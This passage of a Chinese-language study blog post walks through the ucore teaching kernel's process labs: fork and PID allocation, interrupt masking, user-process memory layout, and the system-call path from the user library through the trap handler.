proc_struct</span><br>    <span class="hljs-comment">//    2. call setup_kstack to allocate a kernel stack for child process</span><br>    <span class="hljs-comment">//    3. call copy_mm to dup OR share mm according clone_flag</span><br>    <span class="hljs-comment">//    4. call copy_thread to setup tf &amp; context in proc_struct</span><br>    <span class="hljs-comment">//    5. insert proc_struct into hash_list &amp;&amp; proc_list</span><br>    <span class="hljs-comment">//    6. call wakeup_proc to make the new child process RUNNABLE</span><br>    <span class="hljs-comment">//    7. set ret vaule using child proc&#x27;s pid</span><br>    <span class="hljs-keyword">if</span> ((proc = alloc_proc()) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        cprintf(<span class="hljs-string">&quot;alloc_proc() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> fork_out;<br>    &#125;<br>    proc-&gt;parent = current;<br>    <span class="hljs-keyword">if</span> ((ret = setup_kstack(proc)) != <span class="hljs-number">0</span>)<br>    &#123; <span class="hljs-comment">//call the alloc_pages to alloc kstack space</span><br>        cprintf(<span class="hljs-string">&quot;set_kstack() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> bad_fork_cleanup_proc;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (copy_mm(clone_flags, proc) != <span class="hljs-number">0</span>)<br>    &#123;<br>cprintf(<span class="hljs-string">&quot;copy_mm() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> bad_fork_cleanup_kstack;<br>    &#125;<br>    copy_thread(proc, <span class="hljs-built_in">stack</span>, tf);<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//原来这里还要加上屏蔽中断, 应该是操作当前proc_struct需要一起完成</span><br>     <span class="hljs-comment">//防止某个中断服务例程用到的时候出现错误</span><br>        proc-&gt;pid = get_pid();<br>        hash_proc(proc);<br>        list_add(&amp;proc_list, &amp;(proc-&gt;list_link));<br>        nr_process++;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    wakeup_proc(proc);<br>    ret = proc-&gt;pid;<br>fork_out:<br>    <span class="hljs-keyword">return</span> ret;<br><br>bad_fork_cleanup_kstack:<br>    put_kstack(proc);<br>bad_fork_cleanup_proc:<br>    kfree(proc);<br>    <span class="hljs-keyword">goto</span> fork_out;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>请说明ucore是否做到给每个新fork的线程一个唯一的id？请说明你的分析和理由。</p><p>uCore中，每个新fork的线程都存在唯一的一个ID，理由如下：</p><ul><li><p>这一段代码相当于找出了一个初始为(MAX_PID,MAX_PID), 不满足条件时往pid大的方向查找空闲区间(last_safe, next_safe),<br>只要<code>++last&lt;next</code>则自增后的last即为可分配的pid, 具体流程写进代码注释中</p></li><li><p>所以说就是通过维护一个可用PID的区间, 可以提高分配pid的效率</p></li><li><p><code>get_pid</code>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// get_pid - alloc a unique pid for process</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">get_pid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static_assert</span>(MAX_PID &gt; MAX_PROCESS);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">list_entry_t</span> *<span class="hljs-built_in">list</span> = &amp;proc_list, *le;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> next_safe = MAX_PID, last_pid = MAX_PID;<br>    <span class="hljs-keyword">if</span> (++last_pid &gt;= MAX_PID)<br>    &#123;<span class="hljs-comment">//last自增后&gt;=MAX_PID, 从1重新开始, next设为MAX_PID, 待后续缩小范围</span><br>        last_pid = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">goto</span> inside;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (last_pid &gt;= next_safe)<br>    &#123;<span class="hljs-comment">//last自增后&gt;=next, 当前空闲区间**已用完**, 继续向后查找</span><br>    inside:<br>        next_safe = MAX_PID;<br>    repeat:<span class="hljs-comment">//这段代码看半天, 终于看出来是在遍历proc_list, 如果pid==last, last就++</span><br>        <span class="hljs-comment">//如果pid在last和next之间, 则next=pid以缩小范围.</span><br>        <span class="hljs-comment">//特殊情况: ++last&gt;next,则重启while循环, 并且if(++last&gt;MAX_PID)则重置last为1</span><br>        le = <span class="hljs-built_in">list</span>;<br>        <span class="hljs-keyword">while</span> ((le = list_next(le)) != <span class="hljs-built_in">list</span>)<br>        &#123;<br>            proc = le2proc(le, list_link);<br>            <span class="hljs-keyword">if</span> (proc-&gt;pid == last_pid)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (++last_pid &gt;= next_safe)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (last_pid &gt;= MAX_PID)<br>                    &#123;<br>                        last_pid = <span class="hljs-number">1</span>;<br>                    &#125;<br>                    next_safe = MAX_PID;<br>                    <span class="hljs-keyword">goto</span> repeat;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (proc-&gt;pid &gt; last_pid &amp;&amp; next_safe &gt; proc-&gt;pid)<br>            &#123;<br>                next_safe = proc-&gt;pid;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> last_pid;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h3><blockquote><p>理解proc_run</p></blockquote><p><strong>两个问题:</strong> </p><ul><li>在本实验的执行过程中，创建且运行了几个内核线程？<ul><li>两个</li></ul></li><li>语句<code>local_intr_save(intr_flag);....local_intr_restore(intr_flag);</code>在这里有何作用?请说明理由<ul><li>屏蔽中断</li><li>这两句的配合，使得这两句代码之间的代码块形成<strong>原子操作</strong>，可以使得某些关键的代码不会被打断，从而避免引起一些未预料到的错误，避免条件竞争。</li><li>以进程切换为例，在<code>proc_run</code>中，当刚设置好<code>current</code>指针为下一个进程，但还未完全将控制权转移时，如果该过程突然被一个中断所打断，则中断处理例程的执行可能会引发异常，因为<code>current</code>指针指向的进程与实际使用的进程资源不一致。</li></ul></li></ul><p>challenge</p><blockquote><p>鸽!</p></blockquote><h1 id="Lab5"><a href="#Lab5" class="headerlink" title="Lab5"></a>Lab5</h1><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目结构"><a href="#0-项目结构" class="headerlink" title="0.项目结构"></a>0.项目结构</h3><p>相对与实验四，实验五主要改动如下：</p><p>◆ kern/debug/</p><p>kdebug.c：修改：解析用户进程的符号信息表示（可不用理会）</p><p>◆ kern/mm/ （与本次实验有较大关系）</p><p>memlayout.h：修改：增加了用户虚存地址空间的图形表示和宏定义 （需仔细理解）。</p><p>pmm.[ch]：修改：添加了用于进程退出（do_exit）的内存资源回收的page_remove_pte、unmap_range、exit_range函数和用于创建子进程（do_fork）中拷贝父进程内存空间的copy_range函数，修改了pgdir_alloc_page函数</p><p>vmm.[ch]：修改：扩展了mm_struct数据结构，增加了一系列函数</p><ul><li>mm_map/dup_mmap/exit_mmap：设定/取消/复制/删除用户进程的合法内存空间</li><li>copy_from_user/copy_to_user：用户内存空间内容与内核内存空间内容的相互拷贝的实现</li><li>user_mem_check：搜索vma链表，检查是否是一个合法的用户空间范围</li></ul><p>◆ kern/process/ （与本次实验有较大关系）</p><p>proc.[ch]：修改：扩展了proc_struct数据结构。增加或修改了一系列函数</p><ul><li>setup_pgdir/put_pgdir：创建并设置/释放页目录表</li><li>copy_mm：复制用户进程的内存空间和设置相关内存管理（如页表等）信息</li><li>do_exit：释放进程自身所占内存空间和相关内存管理（如页表等）信息所占空间，唤醒父进程，好让父进程收了自己，让调度器切换到其他进程</li><li>load_icode：被do_execve调用，完成加载放在内存中的执行程序到进程空间，这涉及到对页表等的修改，分配用户栈</li><li>do_execve：先回收自身所占用户空间，然后调用load_icode，用新的程序覆盖内存空间，形成一个执行新程序的新进程</li><li>do_yield：让调度器执行一次选择新进程的过程</li><li>do_wait：父进程等待子进程，并在得到子进程的退出消息后，彻底回收子进程所占的资源（比如子进程的内核栈和进程控制块）</li><li>do_kill：给一个进程设置PF_EXITING标志（“kill”信息，即要它死掉），这样在trap函数中，将根据此标志，让进程退出</li><li>KERNEL_EXECVE/__KERNEL_EXECVE/__KERNEL_EXECVE2：被user_main调用，执行一用户进程</li></ul><p>◆ kern/trap/</p><p>trap.c：修改：在idt_init函数中，对IDT初始化时，设置好了用于系统调用的中断门（idt[T_SYSCALL]）信息。这主要与syscall的实现相关</p><p>◆ user/*</p><p>新增的用户程序和用户库</p><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><ul><li>kern_init()-&gt;proc_init()-&gt;initproc-&gt;init_main()-&gt;kern_thread()-&gt;kernel_execve()</li><li>下图是虚拟内存的分布图, 注意page table固定在0xFAC00000的位置, 又给忘记了导致想了一会儿,<br>对于每个进程来说所看到的内存空间都是这样的.</li></ul> <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * Virtual memory map:                                          Permissions</span><br><span class="hljs-comment"> *                                                              kernel/user</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     4G ------------------&gt; +---------------------------------+</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            |         Empty Memory (*)        |</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            +---------------------------------+ 0xFB000000</span><br><span class="hljs-comment"> *                            |   Cur. Page Table (Kern, RW)    | RW/-- PTSIZE</span><br><span class="hljs-comment"> *     VPT -----------------&gt; +---------------------------------+ 0xFAC00000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     KERNTOP -------------&gt; +---------------------------------+ 0xF8000000</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            |    Remapped Physical Memory     | RW/-- KMEMSIZE</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *     KERNBASE ------------&gt; +---------------------------------+ 0xC0000000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     USERTOP -------------&gt; +---------------------------------+ 0xB0000000</span><br><span class="hljs-comment"> *                            |           User stack            |</span><br><span class="hljs-comment"> *                            +---------------------------------+</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            :                                 :</span><br><span class="hljs-comment"> *                            |         ~~~~~~~~~~~~~~~~        |</span><br><span class="hljs-comment"> *                            :                                 :</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-comment"> *                            |       User Program &amp; Heap       |</span><br><span class="hljs-comment"> *     UTEXT ---------------&gt; +---------------------------------+ 0x00800000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *                            |  - - - - - - - - - - - - - - -  |</span><br><span class="hljs-comment"> *                            |    User STAB Data (optional)    |</span><br><span class="hljs-comment"> *     USERBASE, USTAB------&gt; +---------------------------------+ 0x00200000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     0 -------------------&gt; +---------------------------------+ 0x00000000</span><br><span class="hljs-comment"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span><br><span class="hljs-comment"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span><br><span class="hljs-comment"> *     there if desired.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * */</span><br></code></pre></div></td></tr></table></figure><h3 id="2-创建用户进程"><a href="#2-创建用户进程" class="headerlink" title="2.创建用户进程"></a>2.创建用户进程</h3><h4 id="a-应用程序的组成和编译"><a href="#a-应用程序的组成和编译" class="headerlink" title="a. 应用程序的组成和编译"></a>a. 应用程序的组成和编译</h4><p>从实验提供的用户程序编译入手, 可以看出hello应用程序不仅仅是hello.c，还包含了支持hello应用程序的用户态库：</p><ul><li>user/libs/initcode.S：所有应用程序的起始用户态执行地址“_start”，调整了EBP和ESP后，调用umain函数。</li><li>user/libs/umain.c：实现了umain函数，这是所有应用程序执行的第一个C函数，它将调用应用程序的main函数，并在main函数结束后调用exit函数，而exit函数最终将调用sys_exit系统调用，让操作系统回收进程资源。</li><li>user/libs/ulib.[ch]：实现了最小的C函数库，除了一些与系统调用无关的函数，其他函数是对访问系统调用的包装。</li><li>user/libs/syscall.[ch]：用户层发出系统调用的具体实现。</li><li>user/libs/stdio.c：实现cprintf函数，通过系统调用sys_putc来完成字符输出。</li><li>user/libs/panic.c：实现__panic/__warn函数，通过系统调用sys_exit完成用户进程退出。</li></ul><p>除了这些用户态库函数实现外，还有一些libs/*.[ch]是操作系统内核和应用程序共用的函数实现。<strong>这些用户库函数其实在本质上与UNIX系统中的标准libc没有区别</strong>，只是实现得很简单，但hello应用程序的正确执行离不开这些库函数。</p><p>在make的最后一步执行了一个ld命令，把hello应用程序的执行码obj/__user_hello.out连接在了ucore kernel的末尾。且ld命令会在kernel中会把__user_hello.out的位置和大小记录在全局变量_binary_obj___user_hello_out_start和_binary_obj___user_hello_out_size中，这样这个hello用户程序就能够和ucore内核一起被 bootloader 加载到内存里中，并且通过这两个全局变量定位hello用户程序执行码的起始位置和大小。而到了与文件系统相关的实验后，ucore会提供一个简单的文件系统，那时所有的用户程序就都不再用这种方法进行加载了，而可以用大家熟悉的文件方式进行加载了。</p><h4 id="b-用户进程的虚拟地址空间"><a href="#b-用户进程的虚拟地址空间" class="headerlink" title="b. 用户进程的虚拟地址空间"></a>b. 用户进程的虚拟地址空间</h4><p>在tools/user.ld描述了用户程序的用户虚拟空间的执行入口虚拟地址：</p><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq">SECTIONS &#123;<br>    /* <span class="hljs-keyword">Load</span> programs <span class="hljs-built_in">at</span> this address: <span class="hljs-string">&quot;.&quot;</span> means the current address */<br>    . = <span class="hljs-number">0x800020</span>;<br></code></pre></div></td></tr></table></figure><p>在tools/kernel.ld描述了操作系统的内核虚拟空间的起始入口虚拟地址：</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-class">SECTIONS </span>&#123;<br>    <span class="hljs-comment">/* Load the kernel at this address: &quot;.&quot; means the current address */</span><br>    . = <span class="hljs-number">0xC0100000</span>;<br></code></pre></div></td></tr></table></figure><p>这样ucore把用户进程的虚拟地址空间分了两块，一块与内核线程一样，是所有用户进程都共享的内核虚拟地址空间，映射到同样的物理内存空间中，这样在物理内存中只需放置一份内核代码，使得用户进程从用户态进入核心态时，内核代码可以统一应对不同的内核程序；另外一块是用户虚拟地址空间，虽然虚拟地址范围一样，但映射到不同且没有交集的物理内存空间中。这样当ucore把用户进程的执行代码（即应用程序的执行代码）和数据（即应用程序的全局变量等）放到用户虚拟地址空间中时，确保了各个进程不会“非法”访问到其他进程的物理内存空间。</p><h4 id="c-创建并执行用户进程"><a href="#c-创建并执行用户进程" class="headerlink" title="c. 创建并执行用户进程"></a>c. 创建并执行用户进程</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">vector128(vectors.S)--\&gt;<br>__alltraps(trapentry.S)--\&gt;trap(trap.c)--\&gt;trap_dispatch(trap.c)--\&gt;syscall(syscall.c)--\&gt;sys_exec(syscall.c）<br>--\&gt;do_execve(proc.c)<br></code></pre></div></td></tr></table></figure><blockquote><p>先清空当前进程的空间, 然后再alloc新的空间</p></blockquote><p>最终通过<strong>do_execve</strong>函数来完成用户进程的创建工作。</p><p><strong>load_icode</strong>函数的主要工作就是给用户进程建立一个能够让用户进程正常运行的用户环境。此函数有一百多行.</p><h3 id="3-系统调用实现"><a href="#3-系统调用实现" class="headerlink" title="3.系统调用实现"></a>3.系统调用实现</h3><p>采用系统调用机制为用户进程提供一个获得操作系统服务的统一接口层，这样一来可简化用户进程的实现，把一些共性的、繁琐的、与硬件相关、与特权指令相关的任务放到操作系统层来实现，但提供一个简洁的接口给用户进程调用；二来这层接口事先可规定好，且严格检查用户进程传递进来的参数和操作系统要返回的数据，使得让操作系统给用户进程服务的同时，保护操作系统不会被用户进程破坏。</p><p>从硬件层面上看，需要硬件能够支持在用户态的用户进程通过某种机制切换到内核态。试验一讲述中断硬件支持和软件处理过程其实就可以用来完成系统调用所需的软硬件支持。下面我们来看看如何在ucore中实现系统调用。</p><h4 id="a-初始化系统调用对应的中断描述符"><a href="#a-初始化系统调用对应的中断描述符" class="headerlink" title="a. 初始化系统调用对应的中断描述符"></a>a. 初始化系统调用对应的中断描述符</h4><p>在ucore初始化函数kern_init中调用了idt_init函数来初始化中断描述符表，并设置一个特定中断号的中断门，专门用于用户进程访问系统调用。此事由ide_init函数完成：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">idt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">extern</span> <span class="hljs-keyword">uintptr_t</span> __vectors[];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(idt) / <span class="hljs-keyword">sizeof</span>(struct gatedesc); i ++) &#123;<br>        SETGATE(idt[i], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);<br>    &#125;<br>    SETGATE(idt[T_SYSCALL], <span class="hljs-number">1</span>, GD_KTEXT, __vectors[T_SYSCALL], DPL_USER);<br>    lidt(&amp;idt_pd);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在上述代码中，可以看到在执行加载中断描述符表lidt指令前，专门设置了一个特殊的中断描述符idt[T_SYSCALL]，它的特权级设置为DPL_USER，中断向量处理地址在__vectors[T_SYSCALL]处。这样建立好这个中断描述符后，一旦用户进程执行“INT T_SYSCALL”后，由于此中断允许用户态进程产生（注意它的特权级设置为DPL_USER），所以CPU就会从用户态切换到内核态，保存相关寄存器，并跳转到__vectors[T_SYSCALL]处开始执行，形成如下执行路径：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">vector128(vectors.S)--\&gt;<br>__alltraps(trapentry.S)--\&gt;trap(trap.c)--\&gt;trap_dispatch(trap.c)--\&gt;syscall(syscall.c)<br></code></pre></div></td></tr></table></figure><p>在syscall中，根据系统调用号来完成不同的系统调用服务。</p><h4 id="b-建立系统调用的-用户库-准备"><a href="#b-建立系统调用的-用户库-准备" class="headerlink" title="b. 建立系统调用的**用户库**准备"></a>b. 建立系统调用的**<u>用户库</u>**准备</h4><p>在操作系统中初始化好系统调用相关的中断描述符、中断处理起始地址等后，还需在用户态的应用程序中初始化好相关工作，简化应用程序访问系统调用的复杂性。<strong>为此在用户态建立了一个中间层，即简化的libc实现</strong>，在user/libs/ulib.[ch]和user/libs/syscall.[ch]中完成了对访问系统调用的封装。用户态最终的访问系统调用函数是syscall，实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, ...)</span> </span>&#123;<br>    va_list ap;<br>    va_start(ap, num);<br>    <span class="hljs-keyword">uint32_t</span> a[MAX_ARGS];<br>    <span class="hljs-keyword">int</span> i, ret;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_ARGS; i ++) &#123;<br>        a[i] = va_arg(ap, <span class="hljs-keyword">uint32_t</span>);<br>    &#125;<br>    va_end(ap);<br><br>    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;int %1;&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;=a&quot;</span> (ret)</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;i&quot;</span> (T_SYSCALL),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;a&quot;</span> (num),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;d&quot;</span> (a[<span class="hljs-number">0</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;c&quot;</span> (a[<span class="hljs-number">1</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;b&quot;</span> (a[<span class="hljs-number">2</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;D&quot;</span> (a[<span class="hljs-number">3</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;S&quot;</span> (a[<span class="hljs-number">4</span>])</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;cc&quot;</span>, <span class="hljs-string">&quot;memory&quot;</span>)</span></span>;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>从中可以看出，应用程序调用的exit/fork/wait/getpid等库函数最终都会调用syscall函数，只是调用的参数不同而已，如果看最终的汇编代码会更清楚：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">……<br>  34:    8b 55 d4               mov    -0x2c(%ebp),%edx<br>  37:    8b 4d d8               mov    -0x28(%ebp),%ecx<br>  3a:    8b 5d dc               mov    -0x24(%ebp),%ebx<br>  3d:    8b 7d e0               mov    -0x20(%ebp),%edi<br>  40:    8b 75 e4               mov    -0x1c(%ebp),%esi<br>  43:    8b 45 08               mov    0x8(%ebp),%eax<br>  46:    cd 80                  int    $0x80<br>  48: 89 45 f0                mov    %eax,-0x10(%ebp)<br>……<br></code></pre></div></td></tr></table></figure><p>可以看到其实是把系统调用号放到EAX，其他5个参数a[0]~a[4]分别保存到EDX/ECX/EBX/EDI/ESI五个寄存器中，及最多用6个寄存器来传递系统调用的参数，且系统调用的返回结果是EAX。比如对于getpid库函数而言，系统调用号（SYS_getpid=18）是保存在EAX中，返回值（调用此库函数的的当前进程号pid）也在EAX中。</p><h4 id="c-与用户进程相关的系统调用"><a href="#c-与用户进程相关的系统调用" class="headerlink" title="c. 与用户进程相关的系统调用"></a>c. 与用户进程相关的系统调用</h4><p>在本实验中，与进程相关的各个系统调用属性如下所示：</p><table><thead><tr><th>系统调用名</th><th>含义</th><th>具体完成服务的函数</th></tr></thead><tbody><tr><td>SYS_exit</td><td>process exit</td><td>do_exit</td></tr><tr><td>SYS_fork</td><td>create child process, dup mm</td><td>do_fork–&gt;wakeup_proc</td></tr><tr><td>SYS_wait</td><td>wait child process</td><td>do_wait</td></tr><tr><td>SYS_exec</td><td>after fork, process execute a new program</td><td>load a program and refresh the mm</td></tr><tr><td>SYS_yield</td><td>process flag itself need resecheduling</td><td>proc-&gt;need_sched=1, then scheduler will rescheule this process</td></tr><tr><td>SYS_kill</td><td>kill process</td><td>do_kill–&gt;proc-&gt;flags |= PF_EXITING, –&gt;wakeup_proc–&gt;do_wait–&gt;do_exit</td></tr><tr><td>SYS_getpid</td><td>get the process’s pid</td><td></td></tr></tbody></table><p>通过这些系统调用，可方便地完成从进程/线程创建到退出的整个运行过程。</p><h4 id="d-系统调用的执行过程"><a href="#d-系统调用的执行过程" class="headerlink" title="d. 系统调用的执行过程"></a>d. 系统调用的执行过程</h4><p>当进入int 0x80中断后, 处理器和汇编码合作完成压入trapframe, 调用trap函数, 可以看到和之前的代码多了判断current的部分, </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">trap</span><span class="hljs-params">(struct trapframe *tf)</span> </span>&#123;<br>    <span class="hljs-comment">// dispatch based on what type of trap occurred</span><br>    <span class="hljs-comment">// used for previous projects</span><br>    <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">NULL</span>) &#123;<br>        trap_dispatch(tf);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// keep a trapframe chain in stack</span><br>        <span class="hljs-comment">// 干嘛要保存这东西?</span><br>        struct trapframe *otf = current-&gt;tf;<br>        current-&gt;tf = tf;<br><br>        <span class="hljs-keyword">bool</span> in_kernel = trap_in_kernel(tf);<br><br>        trap_dispatch(tf);<br><br>        current-&gt;tf = otf;<br>        <span class="hljs-keyword">if</span> (!in_kernel) &#123;<br>            <span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_EXITING) &#123;<span class="hljs-comment">//只有do_kill()才会设置PF_EXITING</span><br>                